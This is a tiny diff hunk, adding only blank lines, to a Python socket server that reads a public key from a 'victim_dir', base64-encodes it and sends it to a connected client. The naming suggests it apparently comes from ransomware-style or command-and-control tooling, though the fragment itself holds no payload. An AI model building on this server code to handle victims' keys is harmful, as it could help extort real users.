@@ -166,6 +166,10 @@ class Server:
                     file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
                     key_data = file.read()
                     key = base64.b64encode(key_data)
+
+
+
+                    
                     connection.sendall(key)
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                     print("[CLIENT]: "+msg)
